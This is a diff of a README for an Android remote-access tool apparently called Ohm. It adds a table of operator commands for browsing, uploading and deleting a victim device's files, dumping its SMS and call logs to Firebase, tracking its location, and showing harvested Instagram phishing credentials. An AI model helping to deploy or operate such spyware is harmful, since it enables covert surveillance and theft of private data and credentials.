@@ -44,7 +44,7 @@ dmpcalllog  -->
 
 ## Requirements
  * Firebase Account (or you can Create one)
- * Android Device 😂
+ * Android Device :rofl:
 
 ## How to use
 
@@ -70,20 +70,22 @@ dmpcalllog  -->
 
 ## List of Commands
 
-* openfolder * {FOLDER_DIR}
-* uploadfile * {FILE_DIR}
-* deletefile * {FILE_DIR}
-* makefolder * {FILE_DIR}
-* shownotify * {YOUR_MSG}
-* openweburi * {URL}
-* internaldir
-* installedapps
-* sysinfo
-* dumpsms
-* showphishdata
-* getgpslocation
-* getnetworklocation
-* dmpcalllog
+Command | Definition | Example and Usage
+--------|------------|---------
+openfolder * <FOLDER_DIR> | This will Show the contents of Folder | ```openfolder * /sdcard/DCIM ```
+uploadfile * <FILE_DIR> | This will Upload File To Firebase Storage From Device | ``` uploadfile * /sdcard/DCIM/Camera/image.png```
+deletefile * <FILE_DIR> | This Will delete the specific file or folder | ```deletefile * /sdcard/DCIM/Camera/image.png```
+makefolder * <FILE_DIR> | This will create a Folder | ```makefolder * /sdcard/My Folder/```
+shownotify * <YOUR_MSG> | This will show notification | ```shownotify * Your Message```
+openweburi * <URL> | This will open external URL | ```openuri * https://github.com/Th30neAnd0nly/Ohm```
+internaldir | Shows the Internal Storage files and Folders | ```internaldir```
+installedapps | Shows the package name of all the installed apps | ```installedapps```
+sysinfo | Shows The System Information | ```sysinfo```
+dumpsms | Dumps all the SMS and uploads file to Firebase Storage | ```dumpsms```
+showphishdata | Shows the Credentials of  [Instagram](https://github.com/Th30neAnd0nly/PI) |  ```showphishdata```
+getgpslocation | Shows the GPS location | ```getgpslocation```
+getnetworklocation | Shows the Network Location | ```getnetworklocation```
+dmpcalllog  | Dumps all the CALL Log  and upload that file to Firebase Storage | ```dmpcalllog```
 
 
 ---
